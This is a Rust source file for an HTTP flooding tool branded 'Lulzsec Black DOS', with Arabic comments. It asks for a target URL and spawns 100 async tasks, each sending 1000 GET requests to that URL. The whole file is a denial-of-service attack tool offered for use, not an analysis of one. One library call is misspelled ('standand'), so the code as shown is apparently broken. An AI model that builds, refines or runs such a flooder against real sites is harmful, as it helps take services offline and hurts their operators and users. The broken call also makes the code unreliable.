use std::io::{self, Write};
use std::sync::Arc;
use std::time::Duration;
use hyper::Client;
use hyper::client::HttpConnector;
use hyper::Request;
use tokio::task;
use colored::*;
use figlet_rs::FIGfont;

const THREAD_COUNT: usize = 100;
const REQUESTS_PER_THREAD: usize = 1000;

#[tokio::main]
async fn main() {
    // واجهة الأداة باستخدام ASCII art
    let standard_font = FIGfont::standand().unwrap();
    let figure = standard_font.convert("Lulzsec Black DOS");
    println!("{}", figure.unwrap().to_string().red());

    // طلب رابط الموقع من المستخدم
    print!("{}: ", "Enter target URL".yellow());
    io::stdout().flush().unwrap();

    let mut url = String::new();
    io::stdin().read_line(&mut url).expect("Failed to read line");
    let url = url.trim().to_string();

    // إعداد العميل HTTP
    let client = Arc::new(Client::new());

    // إنشاء وتحريك الخيوط
    let mut handles = vec![];
    for _ in 0..THREAD_COUNT {
        let client = Arc::clone(&client);
        let url = url.clone();
        let handle = task::spawn(async move {
            for _ in 0..REQUESTS_PER_THREAD {
                let req = Request::builder()
                    .method("GET")
                    .uri(&url)
                    .body(hyper::Body::empty())
                    .expect("Failed to build request");

                match client.request(req).await {
                    Ok(response) => {
                        println!("{}: {} - {}", "Response".green(), response.status(), response.version());
                    }
                    Err(e) => {
                        eprintln!("{}: {}", "Error".red(), e);
                    }
                }
                // تأخير بسيط بين الطلبات لتجنب التحميل الزائد
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        });
        handles.push(handle);
    }

    // انتظار انتهاء جميع الخيوط
    for handle in handles {
        handle.await.unwrap();
    }
}
